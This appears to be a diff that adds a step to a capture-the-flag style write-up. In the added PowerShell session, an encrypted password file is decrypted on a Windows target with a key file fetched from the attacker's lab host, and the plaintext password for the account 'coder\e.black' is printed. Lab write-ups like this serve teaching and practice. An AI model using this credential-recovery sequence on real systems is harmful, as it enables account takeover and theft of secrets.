@@ -843,6 +843,25 @@ wget http://10.10.14.61/key.key -o key.key
 Ill get both files on the target
 
 ```python
+PS C:\ProgramData> $key = Get-Content ".\key.key"
+$key = Get-Content ".\key.key"
+PS C:\ProgramData> $pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
+$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
+PS C:\ProgramData> $cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
+$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
+PS C:\ProgramData> $read = $cred.GetNetworkCredential().Password
+$read = $cred.GetNetworkCredential().Password
+PS C:\ProgramData> echo $read
+echo $read
+ypOSJXPqlDOxxbQSfEERy300
+PS C:\ProgramData> 
+```
+
+Then ill just repeat the first three steps found in the .diff file then use `GetNetworkCredential` to read the password
+
+# Access as `e.black`
+
+```python
 
 ```
 
